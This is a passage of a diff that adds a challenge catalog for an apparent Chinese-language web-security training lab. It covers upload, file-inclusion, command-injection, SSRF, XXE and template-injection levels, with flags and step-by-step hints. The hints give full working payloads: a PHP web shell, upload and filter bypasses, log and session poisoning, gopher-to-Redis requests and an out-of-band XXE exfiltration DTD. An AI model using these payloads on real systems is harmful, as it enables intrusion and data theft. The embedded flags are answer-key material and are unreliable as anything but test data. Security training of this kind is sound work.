+     "url": "https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML"
+    },
+    {
+     "name": "PortSwigger — DOM XSS",
+     "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based"
+    }
+   ],
+   "bot": true
+  },
+  {
+   "id": "upload1",
+   "category": "upload",
+   "order": 1,
+   "title": "前端校验绕过",
+   "path": "/upload1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{upload1_f221f5d2}",
+   "description_html": "本地写一个 <code shell.php</code （内容任选，能读文件即可）：",
+   "hints": [
+    "点上传按钮会被 JS 拦住？JS 是在【你的浏览器】里运行的，你可以 F12 删掉校验函数，也可以干脆不用浏览器——用 curl 直接发 multipart 请求。",
+    "curl -F \"avatar=@shell.php\" http://TARGET/upload1/ 上传一个内容为 <?php system($_GET['c']);?> 的 shell.php（先在本地把文件写好）。",
+    "完整命令：\ncurl -F \"avatar=@shell.php\" http://TARGET/upload1/\ncurl \"http://TARGET/upload1/uploads/shell.php?c=cat%20../flag.php\"\nflag.php 的 PHP 注释里就是 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "前端 JS 校验的无效性",
+     "url": ""
+    },
+    {
+     "name": "curl 直接构造上传请求",
+     "url": ""
+    },
+    {
+     "name": "一句话木马",
+     "url": ""
+    },
+    {
+     "name": "读注释里的 flag",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "upload2",
+   "category": "upload",
+   "order": 2,
+   "title": "MIME 校验绕过",
+   "path": "/upload2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{upload2_383a7ff6}",
+   "description_html": "<code $ FILES['avatar']['type']</code   不是服务端检测出来的 ——它只是 multipart 请求里客户端自己填的 <code Content-Type</code  头被原样抄进数组。服务端拿它做白名单 = 让攻击者自己检查自己。",
+   "hints": [
+    "直接用浏览器传 shell.php 会被拦（浏览器会如实填 text/x-php）。但 $_FILES['avatar']['type'] 只是把你请求头里自己写的 Content-Type 抄了一遍——用能自定义请求的工具再试。",
+    "curl 的 -F 参数可以给每个 part 单独指定类型：curl -F \"avatar=@shell.php;type=image/jpeg\" —— 文件名还是 .php，类型却是 image/jpeg。",
+    "完整命令：\ncurl -F \"avatar=@shell.php;type=image/jpeg\" http://TARGET/upload2/\ncurl \"http://TARGET/upload2/uploads/shell.php?f=../flag.php\"（shell 用读文件版）或 ?c=cat%20../flag.php（system 版）"
+   ],
+   "knowledge": [
+    {
+     "name": "$_FILES type 可伪造",
+     "url": ""
+    },
+    {
+     "name": "curl -F 指定 part Content-Type",
+     "url": ""
+    },
+    {
+     "name": "finfo 内容探测 vs 自报头",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "upload3",
+   "category": "upload",
+   "order": 3,
+   "title": "黑名单绕过",
+   "path": "/upload3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{upload3_7568e33e}",
+   "description_html": "本题部署环境（nginx+php-fpm）的解析规则覆盖：<code php / php3 / php4 / php5 / php7 / phtml / pht</code （大小写不敏感）。黑名单漏了 <code php3/php4/php7/phtml</code （pht 拦了）。",
+   "hints": [
+    "先试 shell.php —— 被黑名单拦截。黑名单只有 php/php5/phar/pht/phps 五个，而 web 服务器能当 PHP 解析的后缀不止这些。",
+    "本题环境（nginx+php-fpm）配置了 php/php3/php4/php5/php7/phtml/pht（大小写不敏感）都会交给 PHP 执行。试试 shell.phtml —— 不在黑名单里，但照样能跑。",
+    "完整命令：\ncurl -F \"avatar=@shell.phtml\" http://TARGET/upload3/   （shell 内容不变，只是文件后缀换成 phtml）\ncurl \"http://TARGET/upload3/uploads/shell.phtml?f=../flag.php\""
+   ],
+   "knowledge": [
+    {
+     "name": "后缀黑名单绕过",
+     "url": ""
+    },
+    {
+     "name": "phtml/php3 等可解析后缀",
+     "url": ""
+    },
+    {
+     "name": "大小写/点空格（Apache/Windows）",
+     "url": ""
+    },
+    {
+     "name": "白名单思想",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "upload4",
+   "category": "upload",
+   "order": 4,
+   "title": ".user.ini 配置文件上传 getshell",
+   "path": "/upload4",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{upload4_b4bf79ba}",
+   "description_html": "页面白名单是 <code jpg/jpeg/png/gif/ini</code 。上传目录里有一个现成的 PHP 页面 <code uploads/index.php</code （相册入口）——它就是\"待触发的靶子\"。",
+   "hints": [
+    "白名单里除了图片还有一个 .ini——PHP 会自动读每个目录下的 .user.ini，它属于\"配置文件\"而不是数据文件",
+    "auto_prepend_file 是 PHP_INI_PERDIR 指令：写进 uploads/.user.ini 后，该目录所有 PHP 请求都会先自动包含你指定的文件（上传后约 2 秒生效）",
+    "两步走：先传 .user.ini（auto_prepend_file=shell.jpg），再传 shell.jpg（内容读 ../flag.php 源码），最后访问 uploads/index.php 触发"
+   ],
+   "knowledge": [
+    {
+     "name": "user_ini 机制：PHP-FPM 目录级配置与 auto_prepend_file",
+     "url": ""
+    },
+    {
+     "name": ".htaccess（Apache 孪生考点）：SetHandler/AddType 改解析、php_value 注入",
+     "url": ""
+    },
+    {
+     "name": "上传目录禁解析与存储隔离（nginx deny / 对象存储 / user_ini.filename 置空）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "upload5",
+   "category": "upload",
+   "order": 5,
+   "title": "%00 截断",
+   "path": "/upload5",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{upload5_79e3cdba}",
+   "description_html": "拼接结果：uploads/shell.php\\0.jpg C 层所见：uploads/shell.php        ← .jpg 消失",
+   "hints": [
+    "保存名来自 GET 参数 ?save=xxx，服务端会拼成 uploads/xxx.jpg。想让 .jpg 消失，需要一个能让 PHP 字符串“提前结束”的东西。",
+    "URL 里传 %00，PHP 解码后得到 \\0 字节。本环境复刻了 PHP<5.3.4 的行为：路径里的 \\0 之后的字符（包括强拼的 .jpg）都会被截断。",
+    "完整命令：\ncurl -F \"avatar=@shell.php\" \"http://TARGET/upload5/?save=shell.php%00\"\ncurl \"http://TARGET/upload5/uploads/shell.php?f=../flag.php\"（或 system 版 ?c=cat%20../flag.php）"
+   ],
+   "knowledge": [
+    {
+     "name": "%00 截断",
+     "url": ""
+    },
+    {
+     "name": "C 字符串与 \\0",
+     "url": ""
+    },
+    {
+     "name": "PHP 5.3.4 修复史",
+     "url": ""
+    },
+    {
+     "name": "GET 参数拼接保存路径",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "upload6",
+   "category": "upload",
+   "order": 6,
+   "title": "条件竞争",
+   "path": "/upload6",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{upload6_8fc43956}",
+   "description_html": "TOCTOU = Time Of Check To Time Of Use：检查时合法 ≠ 使用时还合法。凡是\"先做后验\"的安全设计都可能中招。",
+   "hints": [
+    "上传一个含 system 的 shell.php 试试 —— 云查杀会在 0.1 秒后删掉它。但注意页面提示：文件在被删除前【真实存在】过。存在的这段时间够不够发一个 GET？",
+    "单线程来回传/访问永远赶不上。用多线程：一组线程不停 POST 上传 shell.php，另一组线程不停 GET 访问 uploads/shell.php，同时开跑。",
+    "更稳的 payload（命中一次就永久赢）：shell.php 内容写 file_put_contents('pwn.txt', file_get_contents('../flag.php')) —— 竞争命中瞬间 flag 被写到不会被删除的 pwn.txt，之后访问 /upload6/uploads/pwn.txt 即可。参考脚本见 writeup。"
+   ],
+   "knowledge": [
+    {
+     "name": "条件竞争",
+     "url": ""
+    },
+    {
+     "name": "TOCTOU 时间窗",
+     "url": ""
+    },
+    {
+     "name": "多线程并发上传+访问",
+     "url": ""
+    },
+    {
+     "name": "file_put_contents 留后门",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "lfi1",
+   "category": "lfi",
+   "order": 1,
+   "title": "企业官网 · 本地文件包含（目录穿越）",
+   "path": "/lfi1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{lfi1_dc62b6a6}",
+   "description_html": "GET /?page=about.php     → 渲染 pages/about.php GET /?page=nope.php      → 报\"文件不存在\"（说明后端在做文件查找）",
+   "hints": [
+    "导航 ?page=about.php 对应后端 include('pages/'.$page)，page 里可以带 ../",
+    "多叠几层 ../ 跳到文件系统根目录（跳过头也安全，路径会在 / 封顶）",
+    "?page=../../../../../flag_lfi1.txt（从 pages/ 起跳 5 层到根，多跳无害；部署：deploy/flag_lfi1.txt 复制到容器 / 才生效）"
+   ],
+   "knowledge": [
+    {
+     "name": "本地文件包含 LFI",
+     "url": ""
+    },
+    {
+     "name": "目录穿越 ../ traversal",
+     "url": ""
+    },
+    {
+     "name": "include 参数可控",
+     "url": ""
+    },
+    {
+     "name": "/etc/passwd 验证",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "lfi2",
+   "category": "lfi",
+   "order": 2,
+   "title": "重构后的官网 · php://filter 读源码",
+   "path": "/lfi2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{lfi2_fcfe849f}",
+   "description_html": "GET /?page=pages/secret config.php → 渲染结果为空（变量定义了，但没有被 echo）",
+   "hints": [
+    "直接 ?page=pages/secret_config.php 没有任何输出：PHP 文件被 include 是被执行，源码看不到",
+    "php://filter/convert.base64-encode/resource=文件 把源码 base64 化后当文本吐出（无需 allow_url_include）",
+    "?page=php://filter/convert.base64-encode/resource=pages/secret_config.php → base64 解码得 flag"
+   ],
+   "knowledge": [
+    {
+     "name": "php://filter 流包装器",
+     "url": ""
+    },
+    {
+     "name": "convert.base64-encode 读源码",
+     "url": ""
+    },
+    {
+     "name": "include 是执行不是显示",
+     "url": ""
+    },
+    {
+     "name": "resource 相对/绝对路径",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "lfi3",
+   "category": "lfi",
+   "order": 3,
+   "title": "v3 官网 · php://input / data:// 代码执行",
+   "path": "/lfi3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{lfi3_766d78dc}",
+   "description_html": "curl -d \"<?php system('cat /<wbr>flag lfi3.txt');? \" \"http://HOST/lfi3/?page=php://input\" 输出：<code flag{lfi3 766d78dc}</code",
+   "hints": [
+    "页面横幅确认 allow_url_include 是否开启（本题环境开启）",
+    "php://input = POST 原始 body；data://text/plain,代码 = URL 里直接写代码（base64 免编码烦恼）",
+    "curl -d \"<?php system('cat /<wbr>flag_lfi3.txt');?>\" \"http://HOST/lfi3/?page=php://input\"；或 ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWdfbGZpMy50eHQnKTs/Pg=="
+   ],
+   "knowledge": [
+    {
+     "name": "php://input 包含 POST body",
+     "url": ""
+    },
+    {
+     "name": "data://text/plain(;base64) 伪协议",
+     "url": ""
+    },
+    {
+     "name": "allow_url_include 前提",
+     "url": ""
+    },
+    {
+     "name": "LFI 升级 RCE",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "lfi4",
+   "category": "lfi",
+   "order": 4,
+   "title": "带访问日志的官网 · 日志文件包含",
+   "path": "/lfi4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{lfi4_16b7abe3}",
+   "description_html": "curl -A \"<?php system('cat /<wbr>flag lfi4.txt');? \" \"http://HOST/lfi4/\" 此时日志里多了一行（实测内容）： [2026-10-24 18:54:57] 172.17.0.1 \"<?php system('cat /<wbr>flag lfi4.txt');? \"",
+   "hints": [
+    "UA 会被原样写进 cache/access.log——UA 是请求头里你随便改的",
+    "curl -A \"<?php system('cat /<wbr>flag_lfi4.txt');?>\" 先污染，再 ?page=../cache/access.log 包含",
+    "curl -A \"<?php system('cat /<wbr>flag_lfi4.txt');?>\" http://HOST/lfi4/ 然后 curl \"http://HOST/lfi4/?page=../cache/access.log\"（集成：deploy/flag_lfi4.txt 复制到 /，cache/ 需对 php-fpm 可写）"
+   ],
+   "knowledge": [
+    {
+     "name": "日志包含 Log Poisoning",
+     "url": ""
+    },
+    {
+     "name": "User-Agent 注入",
+     "url": ""
+    },
+    {
+     "name": "两步攻击：污染日志→包含日志",
+     "url": ""
+    },
+    {
+     "name": "真实场景 /var/log/nginx/access.log",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "lfi5",
+   "category": "lfi",
+   "order": 5,
+   "title": "会员中心 · session 文件包含（附 RFI 讲解）",
+   "path": "/lfi5",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{lfi5_05ea48dd}",
+   "description_html": "curl -c jar.txt --data-urlencode \"username=<?php system('cat /<wbr>flag lfi5.txt');? \" \"http://HOST/lfi5/\" 登录成功页面会显示 PHPSESSID（也可从 jar.txt 里拿）。此时 session 文件内容（实测）： user s:37:\"<?php system('cat /<wbr>flag lfi5.txt');? \";",
+   "hints": [
+    "登录用户名被原样写进 session 文件：本站在 sessions/sess_<PHPSESSID>（真实环境 /var/lib/php/sessions 或 /tmp）",
+    "用 <?php system('cat /<wbr>flag_lfi5.txt');?> 当用户名登录（curl -c 保存 cookie）",
+    "curl -c jar --data-urlencode \"username=<?php system('cat /<wbr>flag_lfi5.txt');?>\" http://HOST/lfi5/ 然后 curl -b jar \"http://HOST/lfi5/?page=../sessions/sess_<PHPSESSID>\""
+   ],
+   "knowledge": [
+    {
+     "name": "session 文件包含",
+     "url": ""
+    },
+    {
+     "name": "session 落盘路径 sess_<PHPSESSID>",
+     "url": ""
+    },
+    {
+     "name": "登录用户名污染 session",
+     "url": ""
+    },
+    {
+     "name": "RFI 概念与 allow_url_include",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "rce1",
+   "category": "rce",
+   "order": 1,
+   "title": "Ping 诊断工具 · 无过滤命令注入",
+   "path": "/rce1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{rce1_29ef51b3}",
+   "description_html": "GET /?ip=127.0.0.1 返回两次 ping 的结果，说明后端确实执行了 <code ping -c 2 127.0.0.1</code 。",
+   "hints": [
+    "页面给出了源码：用户输入被原样拼进 system('ping -c 2 '.$ip)，想想能否在 IP 后面再拼一条命令",
+    "用 ?ip=127.0.0.1;id 先证明第二条命令能执行（输出多出 uid=... 即成功）",
+    "flag 在当前目录 flag.php 的 PHP 注释里：?ip=127.0.0.1;cat flag.php（&& 需编码为 %26%26）"
+   ],
+   "knowledge": [
+    {
+     "name": "命令注入(OS Command Injection)",
+     "url": ""
+    },
+    {
+     "name": "shell 连接符 ; && || |",
+     "url": ""
+    },
+    {
+     "name": "system() 拼接用户输入",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "rce2",
+   "category": "rce",
+   "order": 2,
+   "title": "Ping 诊断工具 v2 · 过滤了空格",
+   "path": "/rce2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{rce2_0936672c}",
+   "description_html": "GET /?ip=127.0.0.1;cat%20flag.php 空格被删掉，shell 收到 <code catflag.php</code  → 输出 <code sh: 1: catflag.php: not found</code 。 而 <code /?ip=127.0.0.1;id</code  依旧能执行 ⇒ 注入还在，只是空格没了。",
+   "hints": [
+    "v2 把输入中的空格全部 str_replace 掉；先用 ;id 确认命令注入仍然成立",
+    "shell 分隔参数不止空格：$IFS 变量、Tab(%09)、< 重定向",
+    "?ip=127.0.0.1;cat${IFS}flag.php 或 ?ip=127.0.0.1%26%26cat%09flag.php 或 ?ip=127.0.0.1;cat<flag.php"
+   ],
+   "knowledge": [
+    {
+     "name": "空格过滤绕过",
+     "url": ""
+    },
+    {
+     "name": "${IFS} / $IFS$9",
+     "url": ""
+    },
+    {
+     "name": "%09 Tab 分隔",
+     "url": ""
+    },
+    {
+     "name": "< 重定向代替空格",
+     "url": ""
+    },
+    {
+     "name": "注意 /bin/sh(dash) 不支持花括号展开",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "rce3",
+   "category": "rce",
+   "order": 3,
+   "title": "Ping 诊断工具 v3 · 关键字黑名单",
+   "path": "/rce3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{rce3_1d37ecb8}",
+   "description_html": "GET /?ip=cat            → 拦截页（🚫 检测到危险关键字） GET /?ip=127.0.0.1;id   → 正常执行（注入还在）",
+   "hints": [
+    "黑名单正则检查的是原始字符串，shell 解析在其后：先摸清哪些词被拦（?ip=cat 会触发拦截页）",
+    "c''at、c\"a\"t、ca\\t 对 shell 都是 cat；变量拼接 a=c;b=at;$a$b 同理",
+    "flag 一词也在黑名单里：?ip=127.0.0.1;c''at fl''ag.php（反斜杠版用 %5C）"
+   ],
+   "knowledge": [
+    {
+     "name": "关键字黑名单绕过",
+     "url": ""
+    },
+    {
+     "name": "引号拼接 c''at",
+     "url": ""
+    },
+    {
+     "name": "反斜杠转义 ca\\t",
+     "url": ""
+    },
+    {
+     "name": "变量拼接 a=c;b=at;$a$b",
+     "url": ""
+    },
+    {
+     "name": "base64 管道执行",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "rce4",
+   "category": "rce",
+   "order": 4,
+   "title": "Ping 诊断工具 v4 · 无回显命令注入（盲注）",
+   "path": "/rce4",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{rce4_00317f34}",
+   "description_html": "GET /?ip=127.0.0.1            → 耗时 0.0x 秒 GET /?ip=127.0.0.1;sleep 5    → 耗时 5.0x 秒 ✅ 注入成立",
+   "hints": [
+    "输出被 >/dev/null 丢弃，但页面显示耗时——?ip=127.0.0.1;sleep 5 试试",
+    "if grep -q rce4 flag.php;then sleep 4;fi 可以把判断变成耗时差异（布尔 oracle）",
+    "?ip=127.0.0.1;cp flag.php out.txt 然后访问 /rce4/out.txt（注意程序尾部自带 >/dev/null，直接 >文件 会被覆盖，可用 cp 或 tee）"
+   ],
+   "knowledge": [
+    {
+     "name": "无回显/盲命令注入",
+     "url": ""
+    },
+    {
+     "name": "时间盲注 sleep 布尔 oracle",
+     "url": ""
+    },
+    {
+     "name": "带外落盘 cp/cat>文件再访问",
+     "url": ""
+    },
+    {
+     "name": "HTTP/DNS 外带概念",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "rce5",
+   "category": "rce",
+   "order": 5,
+   "title": "迷你公式计算器 · eval 代码执行",
+   "path": "/rce5",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{rce5_f29497e7}",
+   "description_html": "GET /?expr=1+2 3      → 7",
+   "hints": [
+    "输入被包进 eval('echo (' . $expr . ');')，先闭合 ) 和 ;，再用 // 注释掉尾部",
+    "?expr=1);phpinfo();// 验证代码执行；?expr=1);print_r(scandir('.'));// 列目录",
+    "?expr=1);highlight_file('flag.php');//"
+   ],
+   "knowledge": [
+    {
+     "name": "eval 代码执行",
+     "url": ""
+    },
+    {
+     "name": "闭合原语句+注释尾部（1);payload;//）",
+     "url": ""
+    },
+    {
+     "name": "代码执行 vs 命令执行",
+     "url": ""
+    },
+    {
+     "name": "highlight_file/show_source 读源码",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "rce6",
+   "category": "rce",
+   "order": 6,
+   "title": "古董模板引擎 · preg_replace /e 代码执行",
+   "path": "/rce6",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{rce6_8b37deda}",
+   "description_html": "GET /?tpl=全场[1+1]折        → 全场2折 GET /?tpl=[phpinfo();]        → 页面出现 phpinfo（无引号，直接成功）",
+   "hints": [
+    "模板里 [1+1] 渲染成 2：方括号内容被求值。/e 修饰符 = replacement 会被 eval，捕获组 \\1 就是你的代码",
+    "带引号的 payload 会 Failed evaluating（/e 对捕获组做 addslashes）→ 用反引号或 $_GET 传参",
+    "?tpl=[`cat flag.php`;] 或 ?tpl=[system($_GET[cmd]);]&cmd=cat flag.php（若部署替代入口：assert 版 ?code=system('cat flag.php')；call_user_func 版 ?func=system&arg=cat flag.php）"
+   ],
+   "knowledge": [
+    {
+     "name": "preg_replace /e 修饰符（后向引用被 eval）",
+     "url": ""
+    },
+    {
+     "name": "/e 的 addslashes 引号转义坑（反引号/$_GET 绕过）",
+     "url": ""
+    },
+    {
+     "name": "assert() 字符串断言（PHP7 替代入口）",
+     "url": ""
+    },
+    {
+     "name": "call_user_func 可控回调（PHP8 替代入口）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssrf1",
+   "category": "ssrf",
+   "order": 1,
+   "title": "链接预览小工具 · 基础 SSRF",
+   "path": "/ssrf1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{ssrf1_72fc9cc2}",
+   "description_html": "GET /robots.txt → Disallow: /internal.php",
+   "hints": [
+    "预览工具是服务器替你发请求——服务器访问 127.0.0.1 时，对方的\"客户端 IP\"就是服务器自己",
+    "robots.txt 提到 internal.php；直接访问会被\"仅本机\"拦截",
+    "?url=http://127.0.0.1/ssrf1/internal.php（独立容器挂载则为 http://127.0.0.1/internal.php）"
+   ],
+   "knowledge": [
+    {
+     "name": "SSRF 原理（服务器代为发请求）",
+     "url": ""
+    },
+    {
+     "name": "回环 127.0.0.1 访问内部接口",
+     "url": ""
+    },
+    {
+     "name": "robots.txt 信息泄露",
+     "url": ""
+    },
+    {
+     "name": "file_get_contents 触发点",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssrf2",
+   "category": "ssrf",
+   "order": 2,
+   "title": "调试版预览工具 · file:// 读文件",
+   "path": "/ssrf2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{ssrf2_f0229966}",
+   "description_html": "GET /?url=ftp://x → ⚠️ 本调试版支持 http/https/file 协议（其余已禁用）",
+   "hints": [
+    "提交 ftp://x 看报错，能得知白名单里多了 file",
+    "file:///etc/passwd 先验证任意读（注意是三个斜杠）",
+    "?url=file:///flag_ssrf2.txt（部署：deploy/flag_ssrf2.txt 复制到容器 /）"
+   ],
+   "knowledge": [
+    {
+     "name": "file:// 流包装器",
+     "url": ""
+    },
+    {
+     "name": "file:/// 绝对路径格式",
+     "url": ""
+    },
+    {
+     "name": "SSRF→任意文件读取",
+     "url": ""
+    },
+    {
+     "name": "协议白名单放宽的危害",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssrf3",
+   "category": "ssrf",
+   "order": 3,
+   "title": "加了黑名单的预览工具 · IP 限制绕过",
+   "path": "/ssrf3",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{ssrf3_c4650bcd}",
+   "description_html": "GET /?url=http://127.0.0.1/internal.php   → 🚫 已拦截 GET /?url=http://192.168.1.1/             → 🚫 已拦截",
+   "hints": [
+    "黑名单是对 host 字符串的 strpos 匹配：127.0.0.1 被拦，但同一个 IP 有很多种写法",
+    "127.1、2130706433、0x7f000001、0177.0.0.1 都解析为 127.0.0.1",
+    "?url=http://2130706433/ssrf3/internal.php（或 127.1 / 0x7f000001 等变体；独立容器去掉 /ssrf3）"
+   ],
+   "knowledge": [
+    {
+     "name": "IP 等价写法绕过字面量黑名单",
+     "url": ""
+    },
+    {
+     "name": "十进制 2130706433 / 十六进制 0x7f000001 / 八进制 0177.0.0.1 / 短格式 127.1",
+     "url": ""
+    },
+    {
+     "name": "302 跳转与 DNS rebinding 概念",
+     "url": ""
+    },
+    {
+     "name": "黑名单 vs 解析后校验",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssrf4",
+   "category": "ssrf",
+   "order": 4,
+   "title": "内网服务探测助手 · gopher 打内网 Redis（模拟）",
+   "path": "/ssrf4",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{ssrf4_a7af29b7}",
+   "description_html": "GET /?url=gopher://127.0.0.1:6379/ PING%250d%250a → 目标返回：+PONG 解码链条：<code %250d%250a</code  —PHP $ GET 解码→ <code %0d%0a</code  —gopher 发包解码→ <code \\r\\n</code 。",
+   "hints": [
+    "PING 探活：?url=gopher://127.0.0.1:6379/_PING%250d%250a（返回 +PONG）",
+    "PHP 解一层码、gopher 再解一层：想让 Redis 收到 GET flag\\r\\n 就写 GET%2520flag%250d%250a",
+    "?url=gopher://127.0.0.1:6379/_GET%2520flag%250d%250a（部署：php redis_fake.php 常驻 127.0.0.1:6379 + /flag_ssrf4.txt）"
+   ],
+   "knowledge": [
+    {
+     "name": "gopher:// 任意 TCP 报文（/_ 后原样发送）",
+     "url": ""
+    },
+    {
+     "name": "双重 URL 编码 %250d%250a",
+     "url": ""
+    },
+    {
+     "name": "dict:// 按行发送",
+     "url": ""
+    },
+    {
+     "name": "Redis 未授权访问与真实打法",
+     "url": ""
+    },
+    {
+     "name": "依赖：php curl 扩展（或自动回退 fsockopen）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "xxe1",
+   "category": "xxe",
+   "order": 1,
+   "title": "星际 HR · XXE 有回显读文件",
+   "path": "/xxe1",
+   "difficulty": 3,
+   "public": false,
+   "flag": "flag{xxe1_1c988126}",
+   "description_html": "cd challenges/xxe/xxe1 php -S 127.0.0.1:8305        # 部署时挂在 /xxe1 flag 文件：<code deploy/flag xxe1.txt</code 。 部署集成 ：复制为容器根 <code /flag xxe1.txt</code  后删除（或屏蔽）<code deploy/</code  目录——页面会自动优先显示 <code /flag xxe1.txt</code 。",
+   "hints": [
+    "DTD 里 <!ENTITY 名字 SYSTEM \"URL\"> 声明外部实体，正文 &名字; 的位置会被替换成 URL 资源内容——URL 可以是 file:// 本地文件。",
+    "页面上直接给了机密档案的绝对路径；Windows 路径 C:\\x\\y 写成 file:///C:/x/y，Linux 路径写成 file:///flag_xxe1.txt。",
+    "payload：<!DOCTYPE resume [<!ENTITY xxe SYSTEM \"file:///<档案路径>\">]><resume><name>&xxe;</name></resume>，导入后回显的 name 位置即档案内容。"
+   ],
+   "knowledge": [
+    {
+     "name": "XML DTD 与实体（内部/外部 SYSTEM 实体）",
+     "url": ""
+    },
+    {
+     "name": "DOMDocument + LIBXML_NOENT/LIBXML_DTDLOAD 的组合",
+     "url": ""
+    },
+    {
+     "name": "file:// 协议读任意文件；php:// 流封装在 libxml 中不可用的原因",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "xxe2",
+   "category": "xxe",
+   "order": 2,
+   "title": "星际物流 · XXE 盲注（OOB 带外）",
+   "path": "/xxe2",
+   "difficulty": 5,
+   "public": false,
+   "flag": "flag{xxe2_936a1958}",
+   "description_html": "cd challenges/xxe/xxe2 node oob server.js 8307        # OOB 监听平台（本地模拟 Collaborator），先起 php -S 127.0.0.1:8306          # 靶机应用",
+   "hints": [
+    "页面只报条数、不回显内容——读到了也看不见。外部实体本质是\"解析器去请求 URL\"：把要读的文件拼进回调 URL，让数据以请求的形式送到 OOB 监听平台（控制台 http://127.0.0.1:8307/）。",
+    "普通实体在内部子集玩不出花，要用参数实体 %：第一步 %remote 让靶机拉取你的外部 DTD（OOB 平台的 /evil.dtd 会动态生成第二级：读文件→拼回调）。",
+    "payload：<!DOCTYPE batch [<!ENTITY % remote SYSTEM \"http://127.0.0.1:8307/evil.dtd?cb=http://127.0.0.1:8307&f=file:///<hex镜像路径>\">%remote;]><batch><item>x</item></batch> ——先试原档案会\"导入成功但无回调\"（{} 过不了 URI 校验），改读十六进制镜像，OOB 日志里的 d= 一串 hex 解码即 flag。"
+   ],
+   "knowledge": [
+    {
+     "name": "无回显场景的 OOB 思路：让服务器把数据\"主动喊\"到监听平台",
+     "url": ""
+    },
+    {
+     "name": "参数实体 % + 外部 DTD 两级构造（%remote → %file/%send）",
+     "url": ""
+    },
+    {
+     "name": "libxml 的 URI 字符集限制（{} 等字符触发 Invalid URI）与 URL 安全镜像的取舍",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssti1",
+   "category": "ssti",
+   "order": 1,
+   "title": "会员欢迎语生成器 · Jinja2 模板注入基础",
+   "path": "/ssti1",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{ssti1_4a3c9c99}",
+   "description_html": "GET /ssti1/?name=小明 渲染结果：<code 欢迎光临 <b (小明) </b ，祝您购物愉快！</code",
+   "hints": [
+    "输入框的内容被直接拼进了模板引擎的模板源码。先输入 {{7*7}} 提交：如果显示 49 而不是 {{7*7}} 本身，说明表达式被服务端计算了——SSTI 实锤。",
+    "引擎把应用配置以模板变量 config（PHP 数组）注入了渲染上下文，{{}} 里能直接访问。试着把整个配置数组打印出来（print_r 样式的输出）。",
+    "flag 存在配置数组的 FLAG 字段：?name={{config}} 在输出里搜 FLAG；精确取值用 ?name={{config['FLAG']}}（PHP 下标语法；点号写法 config.FLAG 会被当常量报错——正好体会与 Jinja2 的语法差异）。"
+   ],
+   "knowledge": [
+    {
+     "name": "SSTI 服务端模板注入",
+     "url": ""
+    },
+    {
+     "name": "自制模板引擎 {{}} 表达式求值（eval 实现）",
+     "url": ""
+    },
+    {
+     "name": "用户输入拼进模板源码（等价 render_template_string 拼接）",
+     "url": ""
+    },
+    {
+     "name": "{{7*7}} 探测与 {{config}} 读配置（PHP 数组下标取 FLAG）",
+     "url": ""
+    }
+   ],
+   "bot": false
+  },
+  {
+   "id": "ssti2",
+   "category": "ssti",
+   "order": 2,
+   "title": "欢迎语生成器 2.0 · Jinja2 过滤绕过",
+   "path": "/ssti2",
+   "difficulty": 1,
+   "public": false,
+   "flag": "flag{ssti2_bbe91042}",
+   "description_html": "GET /ssti2/?name={{7 7}} → 欢迎回来 <b (49) </b ，祝您购物愉快！ GET /ssti2/?name={{config}} → 🚫 安全过滤器：检测到禁止字符/关键词「config」，已拦截！ GET /ssti2/?name={{$ GET}} → 🚫 安全过滤器：检测到禁止字符/关键词「 」，已拦截！ 第三条是本关的第一个坑：PHP 里最顺手的超全局 <code $ GET</code （以及 <code $GLOBALS</code 、<code get defined ",
+   "hints": [
